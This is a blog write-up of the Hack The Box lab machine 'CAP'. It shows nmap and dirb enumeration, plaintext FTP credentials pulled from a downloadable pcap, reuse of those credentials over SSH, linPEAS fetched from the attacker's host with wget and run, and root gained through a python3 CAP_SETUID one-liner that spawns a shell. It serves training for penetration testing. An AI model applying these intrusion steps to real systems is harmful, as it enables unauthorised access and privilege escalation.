---
title: Write-up CAP on HTB
author: eMVee
date: 2021-10-01 21:00:00 +0800
categories: [CTF, HTB]
tags: [HTB, OSCP, capabilities]
render_with_liquid: false
---

Today I was in the mood to hack an easy box on Hack The Box. When I logged on to the website I noticed a machine called 'CAP' a Linux machine and it was counting down to his retirement. This was the machine which triggered me at that moment to hack.

## Getting started
After connecting with HTB via VPN and spinning up the machine, it's time to start.
The first thing I almost every time do when I start, is checking if the host is reachable. A quick ping request will show if the host is responding to ping requests.

```bash
┌──(eMVee@kali)-[~]
└─$ ping -c3 10.129.230.150
PING 10.129.230.150 (10.129.230.150) 56(84) bytes of data.
64 bytes from 10.129.230.150: icmp_seq=1 ttl=63 time=154 ms
64 bytes from 10.129.230.150: icmp_seq=2 ttl=63 time=154 ms
64 bytes from 10.129.230.150: icmp_seq=3 ttl=63 time=215 ms

--- 10.129.230.150 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2002ms
rtt min/avg/max/mdev = 153.737/174.507/215.336/28.871 ms
```

The target responds to our ping request and in the results a ttl=63 shown.
This tells me the target is probably a Linux host, which confirms the host OS.

## Enumeration
After confirming the host is online I started a port scan with nmap with version detection.

```bash
┌──(eMVee@kali)-[~]
└─$ sudo nmap -sS -T4 -sV 10.129.230.150                                             
[sudo] password for eMVee: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-01 10:08 CEST
Nmap scan report for 10.129.230.150
Host is up (0.16s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    gunicorn
1 service unrecognized despite returning data. If you know the service/version, 
please submit the following fingerprint at 
https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.91%I=7%D=10/1%Time=6156C220%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,2FE5,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20
SF:Fri,\x2001\x20Oct\x202021\x2008:09:22\x20GMT\r\nConnection:\x20close\r\
SF:nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20193
SF:86\r\n\r\n<!DOCTYPE\x20html>\n<html\x20class=\"no-js\"\x20lang=\"en\">\
SF:n\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x2
SF:0<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\x20\
SF:x20\x20\x20<title>Security\x20Dashboard</title>\n\x20\x20\x20\x20<meta\
SF:x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-scale=
SF:1\">\n\x20\x20\x20\x20<link\x20rel=\"shortcut\x20icon\"\x20type=\"image
SF:/png\"\x20href=\"/static/images/icon/favicon\.ico\">\n\x20\x20\x20\x20<
SF:link\x20rel=\"stylesheet\"\x20href=\"/static/css/bootstrap\.min\.css\">
SF:\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/fon
SF:t-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20
SF:href=\"/static/css/themify-icons\.css\">\n\x20\x20\x20\x20<link\x20rel=
SF:\"stylesheet\"\x20href=\"/static/css/metisMenu\.css\">\n\x20\x20\x20\x2
SF:0<link\x20rel=\"stylesheet\"\x20href=\"/static/css/owl\.carousel\.min\.
SF:css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/c
SF:ss/slicknav\.min\.css\">\n\x20\x20\x20\x20<!--\x20amchar")%r(HTTPOption
SF:s,B3,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Fri,\x2
SF:001\x20Oct\x202021\x2008:09:23\x20GMT\r\nConnection:\x20close\r\nConten
SF:t-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20HEAD,\x20GET,\x20OP
SF:TIONS\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,121,"HTTP/1\.1\x2
SF:0400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20text
SF:/html\r\nContent-Length:\x20196\r\n\r\n<html>\n\x20\x20<head>\n\x20\x20
SF:\x20\x20<title>Bad\x20Request</title>\n\x20\x20</head>\n\x20\x20<body>\
SF:n\x20\x20\x20\x20<h1><p>Bad\x20Request</p></h1>\n\x20\x20\x20\x20Invali
SF:d\x20HTTP\x20Version\x20&#x27;Invalid\x20HTTP\x20Version:\x20&#x27;RTSP
SF:/1\.0&#x27;&#x27;\n\x20\x20</body>\n</html>\n")%r(FourOhFourRequest,189
SF:,"HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x20F
SF:ri,\x2001\x20Oct\x202021\x2008:09:28\x20GMT\r\nConnection:\x20close\r\n
SF:Content-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20232\
SF:r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2\x20
SF:Final//EN\">\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found</h1>
SF:\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20ser
SF:ver\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20ch
SF:eck\x20your\x20spelling\x20and\x20try\x20again\.</p>\n");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 137.94 seconds
```

The nmap scan results tells me a few things which I would to like write down, so I can check it quickly.

* Ubuntu
* Port 21
    * vsftpd 3.0.3
* Port 22
    * OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
* Port 80
    * gunicorn

This machine is running on port 21 a FTP service. I decided to check if there are exploitable vulnerabilities for vsftpd 3.0.3 with searchsploit.

```bash
┌──(eMVee@kali)-[~]
└─$ searchsploit vsftpd 3.0.3 
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
 vsftpd 3.0.3 - Remote Denial of Service                   | multiple/remote/49719.py
----------------------------------------------------------- ---------------------------------
 Shellcodes: No Results                         
```

That's a pitty, no exploits which I would like to use on this target.
Port 80 is running a webservice, so let's find out what's there on the machine.
I started dirb for directory enumeration and used the default settings.


```bash
┌──(eMVee@kali)-[~]
└─$ dirb http://10.129.230.150             

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Oct  1 10:25:39 2021
URL_BASE: http://10.129.230.150/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                            

---- Scanning URL: http://10.129.230.150/ ----
+ http://10.129.230.150/data (CODE:302| SIZE:208)
+ http://10.129.230.150/ip (CODE:200|SIZE:17369)
+ http://10.129.230.150/netstat (CODE:200|SIZE:34463)

```

After a quick enumeration of directories on the web server I opened the browser to see what's there and open Wappalyzer to see what techniques are used.

![Image](/assets/img/WriteUp/HTB/CAP/HTB-CAP-website.png){: width="700" height="400" }

By openning the website and hovering over the menu on the left side, we can see the linked URL. I decided that the data directory (found with dirb) is the most interesting and I opend it in a second tab in the browser. I noticed a download button to download the 0.pcap file.

![Image](/assets/img/WriteUp/HTB/CAP/HTB-CAP-download-PCAP.png){: width="700" height="400" }

The website offers a download option for a pcap file. Those files can be analyzed with Wireshark. In the file I saw traffic for port 21, which is used for FTP sessions. The FTP protocol is not secure and usernames and passwords are send over the network in plain text.

Within Wireshark I am able to follow the TCP Stream so I could see the actions on the FTP server.
![Image](/assets/img/WriteUp/HTB/CAP/HTB-CAP-Wireshark.png){: width="700" height="400" }

By following the TCP Stream within Wireshark, the whole conversation for the FTP session is shown. As mentioned earier FTP sessions are not secure and usernames and passwords are sent in plain text. This should be seen in the TCP Stream.

![Image](/assets/img/WriteUp/HTB/CAP/HTB-CAP-User-and_Password.png){: width="700" height="400" }


As I had found the username and password for the FTP session within the pcap file via Wireshark I decided to try it on the service.
```bash
┌──(eMVee@kali)-[~]
└─$ ftp 10.129.230.150
Connected to 10.129.230.150.
220 (vsFTPd 3.0.3)
Name (10.129.230.150:eMVee): nathan
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-r--------    1 1001     1001           33 Oct 01 08:05 user.txt
226 Directory send OK.
ftp> get user.txt
local: user.txt remote: user.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for user.txt (33 bytes).
226 Transfer complete.
33 bytes received in 0.00 secs (28.8510 kB/s)
ftp> exit
221 Goodbye.
```
 
By downloading the file to my machine I'm able to read the user.txt flag.
```bash
┌──(eMVee@kali)-[~]
└─$ cat user.txt                
#### SNIP THE USER FLAG ####
```
Okay the user flag is captured!

## Initial foothold
Since the user could logon to the FTP service, it could be probably used as well for the SSH service.

```bash
┌──(eMVee@kali)-[~]
└─$ ssh nathan@10.129.230.150       
nathan@10.129.230.150's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Oct  1 08:45:22 UTC 2021

  System load:  0.08              Processes:             227
  Usage of /:   36.7% of 8.73GB   Users logged in:       0
  Memory usage: 22%               IPv4 address for eth0: 10.129.230.150
  Swap usage:   0%

  => There are 4 zombie processes.

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

63 updates can be applied immediately.
42 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu May 27 11:21:27 2021 from 10.10.14.7
nathan@cap:~$ whoami;hostname;id
nathan
cap
uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
nathan@cap:~$ 
```

By logging on to the SSH service I noticed the host OS Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64). My first command is to see, who I am, the machine which I am using and the membership of the user.

Since we are on a Linux machine we can use an enumeration script to help a bit.
One of my favorite enumeration scripts is linPEAS, which is present on my Kali machine.

I can get the file on the target machine by hosting the file with a Python webserver.
The webserver is started in the linPEAS directory so Only this file is available via the web service.

```bash
┌──(eMVee@kali)-[~/Documents/Usefull/privilege-escalation-awesome-scripts-suite/linPEAS]
└─$ sudo python3 -m http.server 80                  
[sudo] password for eMVee: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

Now the webserver is running on port 80 at my machine it's time to download the file to the victims machine.
I need a writable directory, most of the time therfore I can use /tmp.
after changing the directory to /tmp I had to download the file using the wget command.
The file which I had downloaded is not an exutable yet. By using the chmod +x command followed by the filename, the file will be changed to an executabe file.
The step after this is to execute the script. 

```bash
nathan@cap:~$ cd /tmp
nathan@cap:/tmp$ wget http://10.10.14.50/linpeas.sh
--2021-10-01 10:40:03--  http://10.10.14.50/linpeas.sh
Connecting to 10.10.14.50:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 473371 (462K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                              100%[=============================>] 462.28K   515KB/s    in 0.9s    

2021-10-01 10:40:04 (515 KB/s) - ‘linpeas.sh’ saved [473371/473371]

nathan@cap:/tmp$ chmod +x linpeas.sh 
nathan@cap:/tmp$ ./linpeas.sh 

```

After starting the linPEAS script I watch closely the screen to see what's found and where I can look into during the execution of the script.

![Image](/assets/img/WriteUp/HTB/CAP/HTB-CAP-Capabilities.png){: width="700" height="400" }


As linPEAS mentioned a website below the results and I had no idea of the existence of this vulnerability, I had to read this website: https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities

In the results, I saw the CAP_SETUID was present for Python3. This allows you to change the UID (set UID of root in your process).

## Privilege escalation
Since Python3 is vulnerable for privilege escalation via the linux capabilities I should try to escalate the privileges. Because of this vulnerability we can set the uid to 0 for root permissions and load the /bin/sh process via Python3.
```bash
nathan@cap:~$ python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# id;whoami
uid=0(root) gid=1001(nathan) groups=1001(nathan)
root
# cd /root
# ls
root.txt  snap
# cat root.txt  
#### SNIP THE ROOT FLAG ####
# 
```

Yes, the root flag is captured!